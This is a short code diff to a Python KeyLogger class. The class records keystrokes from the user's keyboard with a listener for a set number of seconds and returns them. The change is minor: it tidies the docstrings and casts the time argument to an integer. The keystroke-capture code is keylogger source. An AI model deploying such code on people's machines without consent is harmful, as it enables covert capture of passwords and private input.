@@ -8,14 +8,12 @@ class KeyLogger:
 
     def __init__(self):
         """Init keylogger
-
         """
         self.keys = ''
         self.listener = None
 
     def on_press(self, key):
         """Convert a raw key to meaningful key
-
         :param key: (str)
         """
         if type(key) == Key:
@@ -42,12 +40,11 @@ class KeyLogger:
 
     def hook_in(self, Xtime):
         """Listen raw keys from user keyboard
-
         :param Xtime: (int)
         :return: (str) a list of raw keys
         """
         self.listener = Listener(on_press=self.on_press)
         self.listener.start()
-        time.sleep(Xtime)
+        time.sleep(int(Xtime))
         self.listener.stop()
         return self.keys
